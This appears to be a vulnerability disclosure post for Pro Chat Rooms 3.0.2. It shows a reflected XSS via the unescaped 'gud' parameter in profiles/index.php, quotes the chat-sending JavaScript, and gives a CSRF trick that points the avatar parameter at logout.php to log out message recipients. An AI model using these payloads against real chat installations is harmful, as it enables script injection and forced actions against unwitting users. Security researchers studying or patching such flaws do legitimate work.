Pro Chat Rooms 3.0.2 (XSS/CSRF) Multiple Vulnerabilities
========================================================


#########################################################################
Pro Chat Rooms Version 3.0.2  (XSS/CSRF) Vulnerabilties
#########################################################################
 
 
## AUTHOR : ZynbER
## HOME   : NoWhere
 
 
## Script WebSite : http://www.prochatrooms.com
 
## Version : Pro Chat Rooms Version 3.0.2
 
 
## EXPLOITS :
 
-==XSS==-
 
http://www.yoursite.com/[path]/profiles/index.php?gud=XSSED
 
Vulnerable code in "/profiles/index.php"
 
 
<b><?php echo C_PRO2;?>: <?php echo $_GET[&#039;gud&#039;];?></b>
 
 
-==CSRF==-
 
When a user sends a message in public room or in pm to onther user ; there is a parameter
to set an avatar (ex:"image.gif"); we will exploit this param to run a CSRF when user get our message
 
The JS sending function; here u can see all params needed to POST a message to user/room
 
//Add a message to the chat server.
function sendChatText() {
 
if(!document.getElementById(&#039;txt_message&#039;).value) {
   alert("You have not entered a message ");
   return;
}
    if(document.getElementById(&#039;whisper&#039;).value.toLowerCase() == document.getElementById(&#039;thisuser&#039;).value.toLowerCase()) {
    alert("You cannot whisper to yourself! ");
    return;
}
if (sendReq.readyState == 4 || sendReq.readyState == 0) {
    sendReq.open("POST", &#039;sendData.php?chat=1&last=&#039; + lastMessage + &#039;&room=&#039; + room, true);
    sendReq.setRequestHeader(&#039;Content-Type&#039;,&#039;application/x-www-form-urlencoded&#039;);
    sendReq.onreadystatechange = handleSendChat;  
    var param = &#039;message=&#039; + document.getElementById(&#039;txt_message&#039;).value;
    param += &#039;&name=&#039; + chat_user;
    param += &#039;&nid=&#039; + chat_userid;
    param += &#039;&chat=1&#039;;
    param += &#039;&room=&#039; + room;
    param += &#039;&whisper=&#039; + document.getElementById(&#039;whisper&#039;).value;
    param += &#039;&fontface=&#039; + document.getElementById(&#039;font_face&#039;).value;
    param += &#039;&fontcolor=&#039; + document.getElementById(&#039;font_color&#039;).value;
    param += &#039;&fontheight=&#039; + document.getElementById(&#039;font_height&#039;).value;
    param += &#039;&fontstyle=&#039; + document.getElementById(&#039;font_style&#039;).value;
    param += &#039;&avatar=&#039; + document.getElementById(&#039;user_avatar&#039;).value;
    sendReq.send(param);
    document.getElementById(&#039;txt_message&#039;).value = &#039;&#039;;
    }                            
}
 
 
Exploit Example:
 
default  ==> http://www.yoursite.com/[path]/Avatars/online.gif
 
 
Your mallecious CSRF param;  avatar=../logout.php ==> New avatar path http://www.yoursite.com/[path]/logout.php
 
 
in this example the user will logout when he recieves ur message; in a public room all users will
be loged out from the room ;)
 
 
 
 
## Note:  
 
This infos are for educational purpose only;  
I&#039;m not responsable for any damage caused...



